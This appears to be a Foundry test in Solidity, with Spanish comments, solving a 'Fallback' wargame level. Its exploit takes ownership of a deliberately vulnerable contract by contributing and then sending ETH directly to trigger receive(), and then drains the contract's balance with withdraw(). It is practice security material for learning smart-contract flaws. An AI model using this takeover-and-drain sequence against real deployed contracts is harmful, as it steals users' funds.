// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackExploit is Test {
    Fallback public target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Desplegamos el contrato víctima. El deployer (este test) es el owner inicial.
        target = new Fallback();
        // Le damos algo de ETH al contrato para que haya algo que robar
        vm.deal(address(target), 5 ether);
        // Le damos fondos al atacante para operar
        vm.deal(attacker, 1 ether);
    }

    function test_TakeOwnershipAndDrain() public {
        // Nos ponemos en la piel del atacante para toda la secuencia
        vm.startPrank(attacker);

        // Estado inicial: el atacante NO es owner
        assertTrue(target.owner() != attacker, "atacante no deberia ser owner aun");

        // ── PASO 1: contribuir un poquito para que contributions[attacker] > 0 ──
        target.contribute{value: 0.0005 ether}();
        assertGt(target.getContribution(), 0, "la contribucion debe ser > 0");

        // ── PASO 2: mandar ETH directo → activa receive() → nos hace owner ──
        (bool ok, ) = address(target).call{value: 1 wei}("");
        require(ok, "el envio directo fallo");

        // Verificamos que el exploit funcionó: ahora el atacante es owner
        assertEq(target.owner(), attacker, "el atacante deberia ser el nuevo owner");

        // ── PASO 3: como owner, vaciamos el balance del contrato ──
        uint256 balanceAntes = attacker.balance;
        target.withdraw();

        // El contrato quedó en cero y el atacante se llevó todo
        assertEq(address(target).balance, 0, "el contrato deberia quedar vacio");
        assertGt(attacker.balance, balanceAntes, "el atacante deberia tener mas ETH");

        vm.stopPrank();

        console.log("Exploit exitoso: atacante tomo ownership y vacio el contrato");
    }
}
